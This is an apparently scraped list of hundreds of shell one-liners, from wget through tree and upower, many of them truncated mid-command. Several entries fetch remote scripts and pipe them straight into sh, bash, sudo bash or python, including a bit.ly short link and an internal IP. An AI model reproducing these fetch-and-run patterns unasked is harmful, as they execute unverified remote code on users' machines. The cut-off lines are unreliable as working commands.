wget http://ipinfo.io/ip -qO - | xargs geoiplookup && wget http://ipinfo.io/ip -qO -
wget http://ipinfo.io/ip -qO - | head -n 1
wget http://dl.xs4all.nl/test/1GB.bin -q -O- | pv > /dev/null
wget http://dl.xs4all.nl/test/1GB.bin -q -O- | pv -a > /dev/null
wget http://dl.xs4all.nl/test/1GB.bin -O- | pv > /dev/null
wget http://checkip.dyndns.org/ -O - -o /dev/null | perl -e
wget http://adarshaj.cse.iitk.ac.in/nyo/table.txt | grep '160037'
wget -qnv -O - http://checkip.dyndns.org/ | grep -oP '\d+\.\d+\.\d+\.\d+'
wget -qO- https://www.gnu.org/software/bash/manual/bash.txt | less
wget -qO- https://www.cse.iitb.ac.in/page137 | grep -Eoi
wget -qO- https://toolbelt.heroku.com/install-ubuntu.sh | sh
wget -qO- https://raw.githubusercontent.com/TCMiranda/BashConfig/master/install | bash
wget -qO- https://raw.github.com/hivetech/dna/develop/utils/golab | bash
wget -qO- https://get.docker.com | sh
wget -qO- https://classic.api.zcha.in/v1/mainnet/network | python -m json.tool
wget -qO- https://bootstrap.pypa.io/get-pip.py | python
wget -qO- http://xkcd.com/|tee >(eog \$(grep -Po '(?<=\
wget -qO- http://www.uzic.ch/accueil.php | sed -n
wget -qO- http://ipecho.net/plain | xargs echo
wget -qO- http://ipecho.net/plain | pbcopy
wget -qO- bench.sh | bash
wget -qO - https://deb.opera.com/archive.key | sudo apt-key add -
wget -qO - https://bit.ly/2mBJSJo | sudo bash && pulseaudio -k
wget -qO - http://wttr.in/ | head -7
wget -qO - http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
wget -q http://archive.getdeb.net/getdeb-archive.key -O- | sudo apt-key add -
wget -q -nv -O - http://gist.github.com/raw/863014/script-skeleton.py | vim - -c 'set filetype=python'
wget -q -O- https://bitpay.com/api/rates | json_pp
wget -q -O- 'http://www.moanmyip.com/' | perl -0777 -pe 's[.*<div class=\
wget -q -O - http://checkip.dyndns.org|sed s/[^0-9.]//g
wget -q -O - http://celestrak.net/NORAD/elements/cubesat.txt | sed -ne '/DELPH/{p;n;p;n;p}' > $HOME/delphini_calender/DELPHINI_TLE.txt
wget -q -O - http://10.173.119.78/kickstart/mint/s.mint-zfs/test4 | /bin/bash
wget -q -O - checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
wget -q -O - checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
wget -q -O - 'http://httpbin.org/ip' | cat -
wget -q -O - ${HTTP}/test4 | /bin/bash
wget -q -O - ${HTTP}/test3 | /bin/bash
wget -q -O - ${HTTP}/test2 | /bin/bash
wget -q -O - ${HTTP}/test1 | /bin/bash
wget -q --no-check-certificate -O - https://raw.github.com/sivel/speedtest-cli/master/speedtest.py | python
wget -O- https://get.docker.com/ | sh
wget -O- -q http://skew-t.com/weather/data.php?type=currentx | jq
wget -O - https://raw.githubusercontent.com/theapache64/sh/master/vscode_insiders_updater.sh -q --show-progress | bash
wget -O - https://raw.githubusercontent.com/RubyStarters/Ideas/master/bootstrap | bash
wget -O - http://www.chive-project.com/Download/Redirect|tar -xzp
wget -O - http://placekitten.com/$[500 + RANDOM % 500] | feh -
wget -O - http://checkip.dyndns.org | sed 's/[^0-9.]//g'
wget -O - -q http://checkip.dyndns.org/index.html|sed -e 's/.* //' -e 's/<.*//'
wget -6 http://dl.xs4all.nl/test/1GB.bin -q -O- | pv > /dev/null
wget -4 http://dl.xs4all.nl/test/1GB.bin -q -O- | pv > /dev/null
wget --output-document=/dev/null --report-speed=bits http://speedtest.wdc01.softlayer.com/downloads/test10.zip 2>&1 | grep ') -'
wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.sh && chmod +x shadowsocksR.sh && ./shadowsocksR.sh 2>&1 | tee shadowsocksR.log
wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh && chmod +x shadowsocks.sh && ./shadowsocks.sh 2>&1 | tee shadowsocks.log
wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-go.sh && chmod +x shadowsocks-go.sh && ./shadowsocks-go.sh 2>&1 | tee shadowsocks-go.log
wget --no-cache -O- -q http://www.studiodenuccio.it/sttgest/ip/ip.log | tr -d
wego | less -r
weechat --help|head -n2
webpack --json | webpack-bundle-size-analyzer
webcontainer | sh ~/carlili/scripts/carliliDeploy.sh
web $(ls -1rtd ~/Downloads/* | tail -n 1)
weatherpy -anfo | less
weathermap | imgcat && ansiweather
weather -f fips1704314000 | tac
weather -d 7 | less
weather $(curl -s ipinfo.io | jq .postal -r)
wd list|sort -k 3
wd list | peco
wc -l | trim
wc -l | strip
wc -l | number
wc -l log/* | grep -v -E \
wc -l *.h *.cpp */*.h */*.cpp | sort
wc -l **/*.* | sort
wc -l **/*.* | awk
wc -l err.txt generated.file succ.txt | sort -n
wc -c | numfmt --to=si
wc -c | numfmt --to=iec-i --suffix=B --padding=10
wc -c | awk
watson status | sed \
watch_for /proc/meminfo '^(Dirty|Writeback):'
watch -tn1 'date +%T | toilet -f future --gay'
watch -tn 1 date +%T \| figlet -c -W -l
watch -t -n1 'date +%T|figlet -f big'
watch -t -n1 'date +%T|figlet -f ANSI\ Shadow.flf'
watch -t -n1 'date +%T|figlet -c -f big'
watch -t -n1 'date +%H:%M%t%d/%m|figlet'
watch -t 'kubectl top pods --all-namespaces | sort -rnk4'
watch -t 'kubectl top pods --all-namespaces | sort -rnk3'
watch -t 'kubectl top nodes | sort -rnk4'
watch -t 'kubectl top nodes | sort -rnk3'
watch -n1 'log0 | tail -n \$((LINES-3))'
watch -n1 'cat /proc/cpuinfo | grep -i mhz
watch -n1 'cat /proc/cpuinfo | grep -i hz'
watch -n1 ' sudo iwconfig wlo1 | grep -i quality'
watch -n0.2 'cat /proc/cpuinfo | grep MHz'
watch -n0 'ps -eH | grep node -B 2'
watch -n.5 'cat /proc/cpuinfo | grep \
watch -n 5 thread_pools | grep ' search'
watch -n 5 du -hs err.txt generated.file succ.txt | sort -h
watch -n 30 'condor_q -batch $USER | tail -n 40'
watch -n 3 'sensors | grep °C'
watch -n 1 echo $(cat /sys/class/thermal/thermal_zone0/type)=$(cat /sys/class/thermal/thermal_zone0/temp) $(cat /sys/class/thermal/thermal_zone1/type)=$(cat /sys/class/thermal/thermal_zone1/temp) $(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu1/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu2/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu3/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu4/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu5/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu6/cpufreq/scaling_cur_freq /sys/devices/system/cpu/cpu7/cpufreq/scaling_cur_freq | tr '\n' ' ')
watch -n 1 dmesg \| tail -n \$\(\(\$\(tput lines\)-2\)\)
watch -n 1 dmesg -Tx \| tail -n
watch -n 1 'sudo pdnsd-ctl status | grep -i available'
watch -n 1 'kubectl get pods | grep -v Running'
watch -n 1 'cat /proc/cpuinfo | grep -i mhz'
watch -n 1 '(echo stats ; echo quit ) | nc -q2 $memcached_ip $memcached_port'
watch -n 0.5 -d 'du -csh err.txt generated.file succ.txt | sort -hr'
watch -n 0.5 -d 'du -csh err.txt generated.file succ.txt --block-size=1M | sort -hr'
watch -n 0.5 'sensors | grep -iv core'
watch -n 0.1 'pactl list sinks | grep -i volume'
watch -n 0.1 'lscpu | grep MHz'
watch -n 0 'lscpu | grep MHz'
watch -d -n 1 'echo llen logstash|redis-cli -h 10.0.0.23'
watch -c -n 3 'git log --oneline --color --graph --decorate --all|sed \
watch -c -n 3 'git log --color --pretty=oneline -35| sed \
watch -c -n 3 'git -c color.status=always status |sed \
watch -c -n 1 'git log --oneline --color --graph --decorate --all|sed \
watch -c -n 1 'git log --color --pretty=oneline -35| sed \
watch -c -n 1 'git -c color.status=always status |sed \
watch --no-tittle -n 30 -d --color 'curl -s wttr.in/chicago | grep -v Follow'
watch --interval 0.4 'pgrep buildsome |xargs --no-run-if-empty pstree -l'
watch 'upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E \
watch 'svn st --ignore-externals|grep -v ^X'
watch 'squeue | grep are'
watch 'qstat | cut -c-$COLUMNS'
watch 'ps aux --sort -rss | { head -1; grep python; }'
watch 'pgrep cron | xargs -n 1 pstree -al'
watch 'git status |grep -v ^X'
watch 'du -d 1 -h | gsort -h'
watch '/bin/mount|grep \
wat -s | awk
wars | clip
wal -a 70 -i $(find ~/Pictures/wallpapers/ | shuf -n 1)
w3m http://biot.com/capstats/bpf.html | less
w3m -dump https://www.yoctoproject.org/docs/latest/mega-manual/mega-manual.html | vim -R -
w3m -dump https://www.yoctoproject.org/docs/latest/bitbake-user-manual/bitbake-user-manual.html | vim -R -
w3m -dump http://danielchoi.com/software/vmail.html | less
w3m -dump http://$RPI[1]/apps/aria2c/data/dl | grep page_white
w3m -4 -dump http://chroot-me.in/ip/ | head -n2
w | sort
w | sed -n 's/.* \(:[0-9]\) .*/\1/p'
w | grep 'admin'
w | awk 'NR<3{print} NR>2{s=\
w -sh | sort
vtex deps ls | grep builder-hub
vst | grep running
vscodium --list-extensions | xargs -L 1 echo vscodium --install-extension >> ~/.config/VSCodium/extensions
vs |grep running
vs glog | less
vrms | cowsay -f tux
vpn_otp | tee >(pbcopy) && echo '=> Copied VPN OTP to pasteboard.'
vpn2_otp | tee >(pbcopy) && echo '=> Copied VPN OTP to pasteboard.'
vpipe |jil
vncserver -kill :* | vncserver -geometry 1880x940
vmstat 1 | awk '{now=strftime(\
vmstat -s -S M | grep mem
vmanage list --long vms | less
vm_stat | perl -ne '/page size of (\d+)/ and $size=$1; /Pages\s+([^:]+)[^\d]+(\d+)/ and printf(\
vm list | grep anthony
vlist | cut -d' ' -f 1
visualboyadvance-m &|
visited-branch | dedupe
vimcat ~/.zsh.d/aliases.zsh | ag
vim-cheet-sheet.sh --color=always | less -r
vim' `git diff --name-only | uniq`'
vim ~/notes/\`ls -1t ~/notes | head -n1\`
vim ~/Downloads/$(ls -t ~/Downloads | head -n1)
vim ~/Documents/misc/\`date -Is | sed -e 's/:/-/g'\`.txt
vim ~/Documents/memo/`date +%Y`/`date +%Y-%m`/`date +%Y-%m-%d.md` -c ':%s/<%=\(.\{-}\)%>/\=eval(submatch(1))/ge | 4'
vim ~/.newsboat/urls && sort ~/.newsboat/urls | uniq > /tmp/newsboat.urls && mv /tmp/newsboat.urls ~/.newsboat/urls
vim | lolcat
vim db/migrate/`ls db/migrate | tail -1`
vim db/migrate/$(ls db/migrate/ | tail -n 1)
vim `whereis google-chrome | awk -F ' ' {'print $2'}`
vim `rg --files | fzf`
vim `print_root_dir`/db/migrate/$(ls -t `print_root_dir`/db/migrate | head -1)
vim `ls entries/* | tail -n 1`
vim `ls -t|head -n1`
vim `ls -t | head -n 1 `
vim `ls -t | head -1`i +$
vim `ls -t | head -1`
vim `ls -t | head -1 `
vim `ls -t . | head -n 1`
vim `ls -t err.txt generated.file succ.txt | head -1 `
vim `ls -a | peco`
vim `ls -1a | peco`
vim `ls -1 /home/jdenardo/projects/bakery-calculator/server/app/database/migrations/\`date +%Y\`* | tail -1`
vim `ls -1 ./myfarms/core/database/migrations/\`date +%Y\`* | tail -1`
vim `ls -1 ./database/migrations/schema/*.php | tail -1`
vim `ls -1 ./database/migrations/data/*.php | tail -1`
vim `ls -1 ./database/migrations/\`date +%Y\`* | tail -1`
vim `ls --color=none -t | head -n 1`
vim `git status --short | awk
vim `git status --porcelain | sed -ne
vim `git status --porcelain | awk
vim `git diff --name-only | uniq`
vim `git diff --name-only --diff-filter=M | uniq`
vim `find . | peco`
vim `find . -maxdepth 1 -type f | fzf`
vim `(ls -1tr | tail -1)`
vim `!! | tail -1`
vim \`ls -tr | tail -1\`
vim \`ls -t | head -n 1\`
vim \`git status -s db/migrate | cut -b 4-\`
vim \`git status --short | awk '{print \$2}'\`
vim \`find . -type f -name '*.rb' | selecta\`
vim \`find . -type f -name '*.log' | selecta\`
vim \`find . -type f -name '*' | selecta\`
vim \$(rg . --color never -l -g '' | fzy)
vim \$(ls | hs)
vim \$(git status -s -uno -z | sed 's/ M//g')
vim \$(git status --porcelain | awk '{print \$2}')
vim \$(git status --porcelain | awk '{print $2}')
vim \$(git status --porcelain | ag \
vim \$(find . | fzf)
vim \$(find -type f | fzy)
vim \$(fd . $RC_DIR/ -t f | fzf --preview 'head {}')
vim \$(fd -H -E .git --type file --color=never . | fzy --prompt='❯ ')
vim \$((echo ~/.bashrc && echo ~/.bash_profile)|peco)
vim /tmp/$(cat /dev/urandom | env LC_CTYPE=C tr -cd
vim ./db/migrate/\$(ls db/migrate | tail -n 1)
vim -u <(curl -s https://raw.githubusercontent.com/nomoral/dotfiles/master/vimrc | grep '^ [a-zA-Z]\+ ')
vim -p `ls -t|head -n3`
vim -p `git status --porcelain | cut -c4-`
vim -p `git diff --name-only | uniq`
vim -p `git diff --name-only | grep -v Gemfile`
vim -p \`rg --files | fzf -m\`
vim -p \`git status -s | awk '{print \$2}'\`
vim -p \`git status --porcelain | sed -ne 's/^ M ~\/bomnegocio\//p'\`
vim -p \`git status --porcelain | sed -ne 's/^ M /\/home\/tlima\/bomnegocio\//p'\`
vim -p \`git status --porcelain | awk '{print \$2}'\`
vim -p \$(git ls-files -m| uniq)
vim -p $(git status --porcelain | awk '{print $2}')
vim -p $(git diff --name-only | uniq)
vim -p $(git diff --name-only --diff-filter=U | xargs)
vim -c 'set spell | set syntax=markdown'
vim -c 'colorscheme default' -c 'hardcopy | lpr -o number-up=4' -c quit
vim -c ':h | only'
vim -X `find -type f|sort`
vim -S $HOME/.vim_sessions/$(ls $HOME/.vim_sessions | fzy)
vim -O2 `git status -uall --short | awk
vim -O `ls -t|head -n2`
vim -O `git status --porcelain | awk
vim -O $(gst -s | cut -c4-)
vim -O $(git status -s | sed
vim --version | less
vim --startuptime /dev/stdout +qall | sort -s -n -k 2
vim --servername VIM `ls *.latexmain|sed
vim -- $(ls -t | head -n 1)
vim +star ~/.temp && cat ~/.temp | pbcopy
vim +/HEAD `git diff --name-only | uniq`
vim '+h | only'
vim '+Helptags|q'
vim $(ls|fzf)
vim $(ls | peco)
vim $(ls db/migrate/* | tail -n1)
vim $(ls . -type d | pick)
vim $(ls -t | head -n 1)
vim $(ls -t | head -1)
vim $(ls err.txt generated.file succ.txt | fzy)
vim $(locate home | fzf)
vim $(locate / | fzf)
vim $(git status -s | awk
vim $(git status --porcelain | awk '{print $2}')
vim $(git ls-files |peco)
vim $(git ls-files | peco)
vim $(git diff --name-only | sort -u)
vim $(git diff --name-only stage | grep -v development.ini)
vim $(git diff --name-only --diff-filter=U --raw | tail -1)
vim $(git diff $1 | egrep
vim $(ghq root)/$(ghq list | peco)
vim $(ghq root)/$(ghq list | grep Cj-bc/qiita-post)/
vim $(ghq list -p | peco)/README.md
vim $(find ~/.config/ranger/* ~/.config/polybar/* ~/.config/qutebrowser/* ~/.config/i3/* -type f | fzf)
vim $(find ~ -maxdepth 1|grep
vim $(find ./app/services/* | pick)
vim $(find ./app/models | pick)
vim $(find . | selecta)
vim $(find . | fzf)
vim $(find . type f | fzf)
vim $(find . -type f | peco)
vim $(find . -type f | fzy)
vim $(find -type f | fzy)
vim $(fd -a -H -t f . | fzf-tmux +m)
vim $(echo $(git status --porcelain | sed s/^...//))
vim $(`bangbang` | xargs)
vim $( git diff --name-only --diff-filter=U | uniq )
vi db/migrate/`ls db/migrate | tail -n1`
vi db/migrate/$(ls -t db/migrate/ | head -1)
vi `reals ${tomcatLogDir}/localhost_*.log | head -1`
vi `ls -tr | tail -1`
vi `ls -t | head -n 1`
vi `ls -1t|head -1`
vi `l\s -t err.txt generated.file succ.txt | head -1 `
vi `find . | peco`
vi `fc -n | xargs`
vi `\ls -t err.txt generated.file succ.txt | head -1 `
vi \`ls -lrt | perl -e '@t=<STDIN>; print STDOUT (\$t[\$#t] =~ m:(\S+)$:)[0]' \`
vi \$(find . -name '*.md' | selecta)
vi .config/awesome/rc.lua && echo 'awesome.restart()' | awesome-client
vi -p `git status --porcelain | cut -c4-`
vi $(ls | fzf)
vi $(git status -s | fzf -m)
vi $(git s | awk
vi $(git ls-files | peco)
vi $(git ls-files | fzf)
vi $(git ls-files -m | xargs)
vi $(git ls-files --modified --others --exclude-per-directory=.gitignore | sort)
vi $(find Makefile -type f | fzf)
vi $(find . | fzf)
vi $(find . -maxdepth 5 -type f | peco)
vi $(find *.h -type f | fzf)
vi $(find *.cdf -type f | fzf)
vi $(find *.c -type f | fzf)
vi $(find $HOME | peco)
vi $(find $FZF_FIND_PATH -type f | fzf)
vi $(fasd -flR | fzf --height 50% --reverse)
vi $(=grep -sZl FAILURE **/(surefire|failsafe)-reports/*.txt)
vi $( git diff --name-only --diff-filter=U | xargs )
vgo test $(go list ./... | grep -v /vendor/)
vcsh dotfiles status | less
vboxmanage --help | less
vault2 write -f sys/replication/dr/primary/enable; vault2 write -field wrapping_token sys/replication/dr/primary/secondary-token id=asdf | vault3 write sys/replication/dr/secondary/enable token=-
vault write -f sys/replication/primary/enable; vault write -field wrapping_token sys/replication/primary/secondary-token id=asdf | vault2 write sys/replication/secondary/enable token=-
vault write -f sys/replication/performance/primary/enable; vault write -field wrapping_token sys/replication/performance/primary/secondary-token id=asdf | vault2 write sys/replication/performance/secondary/enable token=-
vault write -f sys/replication/dr/primary/enable; vault write -field wrapping_token sys/replication/dr/primary/secondary-token id=asdf | vault2 write sys/replication/dr/secondary/enable token=-
vault token lookup -format=json | jq -j '.data.meta'
vagrant up 2>&1 | tee vagrant_up-$(date +%Y%m%d_%H%M)
vagrant up 2>&1 | tee vagrant.log
vagrant up --no-provision --provider=openstack 2>&1 | tee up.log
vagrant status | grep running
vagrant status | grep 'not created'
vagrant provision 2>&1 | tee provision.log
vagrant global-status | sed '/^[^\w]$/q'
vagrant global-status | head --lines=-8
vagrant global-status | grep virtualbox
vagrant global-status | grep running
vagrant global-status --prune | grep running
vagrant gatling-rsync-auto | ruby ~/Developer/Gradescope/trim_vsync.rb
v | more
v | m
v | jq
v `git status --porcelain | sed -ne 's/^ M //p'`
v \`git sh | tail -n +2\`
v $(rg --files 2> /dev/null | fzf -m --border)
v $(git diff --name-only | fzf)
v $(fd --type f | fzf)
v $(fasd -lf | fzf)
uuiduc | tr A-Z a-z
uuidgen|sed 's/-//g'
uuidgen| tr '[:upper:]' '[:lower:]'
uuidgen |tr '[:upper:]' '[:lower:]'
uuidgen | xclip -selection clipboard
uuidgen | tr [:upper:] [:lower:]
uuidgen | tr -d -
uuidgen | tr '[[:upper:]]' '[[:lower:]]'
uuidgen | tr '[A-Z]' '[a-z]'
uuidgen | tr '[:upper:]' '[:lower:]'
uuidgen | tr '[:lower:]-' '[:upper:]_'
uuidgen | tr 'A-Z' 'a-z'
uuidgen | sed -r -e 's/-//g' -e 's/.*/\U&/'
uuidgen | pbcopy && pbpaste && echo
uuidgen | pbcopy
uuidgen | lower
uuidgen | cut -d- -f1
uuidgen | cut -c-8
uuidgen | cut -c-16
uuidgen | cut -c-12
uuid | sed 's/-//g'
uuid | pbcopy; pbpaste
uuid -v5 ns:URL keirans-test-$(date +%s) | pbcopy
util/premake5-\$(uname -s | tr '[:upper:]' '[:lower:]')-\$(uname -i) gmake
utf netstat -ano | grep
utf ipconfig | grep IPv4 -B 4 -A 2
usewithtor ttytter | ccze -A
users | tr ' ' \
urxvt& -e urxvt | echo ${PWD} && ls
urxvt 2> /dev/null &|
urxvt --help 2>&1| sed -n '/: /s/^ */! URxvt*/gp'
url http://assets.codestream.us/artifacts/dev/vscode-codestream/codestream-latest.info | cat
uptime | sed -e
uptime | cut -d \
uptime | awk -F 'load averages: ' '{ print $2 }'
uptime | awk -F
uptime | awk '{print $3}'
uptime -p | cut -d
uptime -p | cut -c 4-
uptime -p | cowsay -f tux
upower -i `upower -e | grep 'BAT'`
upower -i `upower -e | grep
upower -i /org/freedesktop/UPower/devices/battery_BAT1|grep percent
upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep percentage
upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep \
upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep -E
upower -i /org/freedesktop/UPower/devices/battery_BAT0|egrep '
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | less
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep time
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep percentage:
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep percentage
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep capacity
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep \
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -i percentage
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -P
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E percentage
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E \
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep --color=never time"
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep 'percentage'
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | awk -F
upower -i ${BATTERY_DEVICE} 2> /dev/null | grep percentage
upower -i $(upower -e | grep BAT)
upower -i $(upower -e | grep --color=never 'BAT')
upower -i $(upower -e | grep 'BAT')
upower -i $(upower -e | grep
upower -d | grep percentage
upower -d | grep energy-rate
upower --show-info /org/freedesktop/UPower/devices/battery_BAT1 | grep
upower --show-info /org/freedesktop/UPower/devices/battery_BAT0 | grep
upload `ls -t|head -1` vid $ir
update | grep \'install\'
unzip -l -p MY_EPUB_FILENAME text/* | w3m -T text/html
until nc -w 3 -z 10.255.250.211 222; do sleep 3; done; pass -c systems/ryzen-dev-vm01 && xclip -o -selection clipboard | ssh -p 222 root@10.255.250.211 cryptroot-unlock
until nc -w 3 -z 10.255.250.210 222; do sleep 3; done; pass -c systems/ryzen-vmm01 && xclip -o -selection clipboard | ssh -p 222 root@10.255.250.210 cryptroot-unlock
unsetopt | grep
unset $(env | awk -F=
unix2dos $1 | lp -o nobanner
uniqHistory | grep
uniq |
uniq reprisea.txt|xargs -I % achan_s %
uniq reprise.txt|xargs -I % pchan_s %
uniq -c | awk '{printf(\
uniq -c | awk '{print \$1\
uncommited | xargs git update-index --assume-unchanged
unbuffer vlc --longhelp --advanced | less-raw
unbuffer task active | sed \$d
unbuffer pacman -Sl aur | grep -v install
unbuffer nice make -j18 2>&1 | more
unbuffer ls -opG | awk
unbuffer bundle exec rspec spec --format Bdd::RSpec::Formatter --fail-fast | tee rspec-output.txt
unbuffer ./run_tests.sh | beautifyAutomatosLogs.sh
uname -sr | sed -e 's/ //'
uname -sr && date && sensors | grep Core && free -h
uname -r|sed 's/^.*[-]//'
uname -r | cut -f 1 -d
uname -mrs | \sed -Ee 's/([^ ]+)/\1 Kernel Version/'
uname -m | tr _ /
uname -a|lolcat
ulimit -c unlimited && sudo systemctl stop ModemManager && sudo ModemManager --debug --log-level=DEBUG | raffaello -f modemmanager
uglifyjs | pbcopy
udf && ruby udf.rb doc| pbcopy && echo 'Copied! Opening browser to copy and paste' && open https://github.com/drivy/etl/wiki/Redshift-UDFs-documentation/_edit
typeset -f 2>&1 | grep -a
typeset -F | sed s/declare\ \-f\ //g
typeset -F | grep -v '^declare -f _.*'
typeset +f | cut -d= -f1
type rvm | head -n 1
type rvm | head -1
tx | grep Down
tx ls | awk
twtxt timeline --limit 1000 | less
twitter timeline --force | less
twidge lsrecent | less
turl -s https://check.torproject.org/ | egrep \
tune2fs -l /dev/sda1 | grep Free
ttyplay ~/.ttyrec/$(ls -1tr ~/.ttyrec | tail -1)
tty-clock -s -c -C 3 -t -B | lolcat
ttv | head -1
tt | grep -e 'Verk'
tt projects rc.list.all.projects=yes 2>/dev/null | grep -E '^\w'
tst results|less
tshark -F pcap -w - | Wireshark -k -i -
ts | wc -l
try_command cowsay && try_command fortune && fortune -ea | cowsay -f small -e oQ
true | clip
trizen -Syu $(trizen -Ssq | fzf); ~/.config/i3blocks/blocks/updates.sh --refresh
trizen -Rsun $(trizen -Qdt | awk -F ' ' '{print $1}')
trizen -Rsnu $(trizen -Qq | fzf)
trizen -Q | grep
trim_left | trim_right
trim | tr '[A-Z]' '[a-z]'
trim | copy
trim \$(git status --porcelain | sed 's/^...//g')
trello -l 'Today' | head -n 1
tree|less
treeflat | grep
treeflat -a | grep
treec | mintree
tree |less
tree | tail -2
tree | tail -1
tree | sed 's/-> [-/a-zA-Z0-9\.\_ ]*//g'
tree | less -R
tree | less
tree | egrep -i
tree ./ -af -I '.git' | ag
tree -q -h -D -F --inodes -C --dirsfirst -p | less
tree -pfiugFD -L 1 | less -R
tree -if --noreport . | sed 's/^\.\///g'
tree -hC | less
tree -h | less
tree -fi | grep -v 'pycache'
tree -fa | grep -i
tree -f | less -r
tree -f -L 10 | grep
tree -f --noreport -i | shuf -n 1
tree -dugpC | less
tree -dC | less -R
tree -dC | less
tree -d | more
tree -d | grep
tree -augphC | less
tree -alC -I '.git|__pycache__'
tree -ahC | less
tree -af . | grep
tree -aI 'vendor|.git'
tree -aCI .git\|.tox
tree -aCF --dirsfirst -I '.git|node_modules'
tree -aC -I '.git|node_modules' --dirsfirst
tree -aC -I '.git|.DS_Store'
tree -aC -I '.git' | less -FRX
tree -a . | grep swp
tree -a -L 3 -I '.git|*org.eclipse*'
tree -a -L 10 -C -I '$ignore_dirs|test'
tree -a -I node_modules\|.git
tree -a -I 'venv|.git'
tree -a -I 'node_modules|.git' -L 4
tree -a -I 'node_modules|.git' --dirsfirst
tree -a -I 'node_modules|.git'
tree -a -I 'node_modules*|.git*'
tree -a -I '.git|vendor'
tree -a -I '.git|node_modules'
tree -a -I '.git|__pycache__'
tree -a -I '.git|.stack-work'
tree -a -I '.git|.ipynb_checkpoints'
tree -a -I '.git|.DS_Store'
tree -a -C --charset nwildner | tr \` \\\\
tree -a --prune --noreport -h -C -I '*.git' | most
tree -a --dirsfirst | less -W
tree -NF | perl -pe 's/^├── //g; s/^└── //g; s/^│\xc2\xa0\xc2\xa0\x20//g; s/├── /\t/g; s/│\xc2\xa0\xc2\xa0\x20/\t/g; s/└── /\t/g; s/ /\t/g; s/\*$//g; s/^\.\n//g;'
tree -NC | less -R
tree -L 4 | less
tree -L 3 | less
tree -L 3 -a -I 'node_modules|.git' -N
tree -L 3 -I 'node_modules|coverage'
tree -L 3 -I 'node_modules|.git'
tree -L 3 --noreport -Fsh --dirsfirst ~/doc -I MuttMail |less
tree -L 2 | less
tree -L 2 -C | more
tree -L 2 -C -I '.git|node_modules'
tree -L 2 --noreport -Fsh --dirsfirst -I zjunk ~/ |less
tree -L 2 --noreport -Fsh --dirsfirst -I zjunk -I Dropbox ~/ |less
tree -L 1 | tail -1
tree -L 1 err.txt generated.file succ.txt | less -F
tree -I 'venv|__pycache__'
tree -I 'vendor|tmp' --matchdirs
tree -I 'target|lib_managed'
tree -I 'public|node_modules'
tree -I 'node_modules|vendor'
tree -I 'node_modules|ui'
tree -I 'node_modules|tmp'
tree -I 'node_modules|site'
tree -I 'node_modules|lib'
tree -I 'node_modules|cache'
tree -I 'node_modules|build'
tree -I 'node_modules|bower_components'
tree -I 'node_modules|__pycache__'
tree -I 'node_modules|.git' -F --noreport
tree -I 'node_modules|.git'
tree -I 'git|node*'
tree -I '__pycache__|venv'
tree -I '__pycach*|*.pyc'
tree -I '.git|.jhw-cache'
tree -I '*svn|*node_module*'
tree -I '*.pyc|__pycache__'
tree -Fth -L 2 --du |less
tree -FAC | less -r
tree -FAC -I '*~|*.swp' --noreport
tree -F -N -a -I '.git|.svn'
tree -C|less -R
tree -Csu|more
tree -Csuh | more
tree -Csu | more
tree -Csu | less -R
tree -Chuf | less -RFX
tree -Chsu | less -R
tree -Ch && echo tree |espeak
tree -Cf | less -R
tree -Cdf | less -RFX
tree -Ca | less -R
tree -CL 4 | less -FRNX
tree -CL 3 | less -FRNX
tree -CL 2 | less -FRNX
tree -CL 1 | less -FRNX
tree -CFa -I 'rhel.*.*.package|.git' --dirsfirst
tree -CF | less
tree -C |less
tree -C | more
tree -C | less -r
tree -C | less -XRF
tree -C | less -RF
tree -C | less -R
tree -C | less
tree -C . | less -R
tree -C -a -I '.git|.DS_Store' --noreport
tree -C -I 'vendor|node_modules'
tree -C -I '*.pyc|__pycache__'
tree -C --matchdirs -I target -f | grep -i
tree -C --du -h . | less -R
tree -AC | less -r
tree -A -f -d -L 4 -I 'bower_components|node_modules' --noreport
tree -A -f -d -L 3 -I 'bower_components|node_modules' --noreport
tree -A -f -d -L 2 -I 'bower_components|node_modules' --noreport
tree -A -f -d -L 1 -A -I 'bower_components|node_modules' --noreport
tree -A -L 3 -I 'bower_components|node_modules' --dirsfirst --noreport
tree -A -L 2 -I 'bower_components|node_modules' --dirsfirst --noreport
tree -A -L 1 -h -I 'node_modules|bower_components' --dirsfirst --du --sort=size
tree -A -L 1 -I 'bower_components|node_modules' --dirsfirst --noreport
tree -A -I 'node_modules|bower_components' --timefmt=%F --dirsfirst --noreport
tree -A -I 'CVS|*~'
tree --du -d -shaC | grep -Ev '( *[^ ]* ){2}\['
tree --dirsfirst -F -I '.git|build'
tree $@ --charset=unicode|LC_CTYPE=C sed 's/-/--/g; s/ / /g;s/-- /--- /g'
tree $1 --noreport -tiafFD | tail
tre -C | less -R
trash-list | grep
transmission-remote -l | grep -v 100%
transmission-remote -l | awk '\$2 == \
translate -s en -t zh-TW | less
